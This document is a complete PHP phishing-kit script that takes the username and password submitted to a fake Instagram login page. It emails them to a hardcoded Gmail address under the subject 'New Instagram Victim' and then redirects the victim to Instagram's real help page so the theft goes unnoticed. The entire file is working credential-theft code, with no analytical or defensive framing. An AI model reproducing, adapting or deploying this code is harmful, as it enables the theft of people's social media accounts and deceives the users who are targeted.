<?php
                                                                                                                   
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$message .= "========== Instagram Login ==========\n";
$message .= "User: ".$_POST['username']."\n";
$message .= "Pass: ".$_POST['password']."\n";
$message .= "----------\n";
$message .= "Log : $time / $date \n";
$rnessage = "$message\n";
$send= "ahmed.12.soliman@gmail.com";
$subject = "New Instagram Victim | $ip";
$headers = "From: Instagram";

if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}
header("Location: https://help.instagram.com/");
?>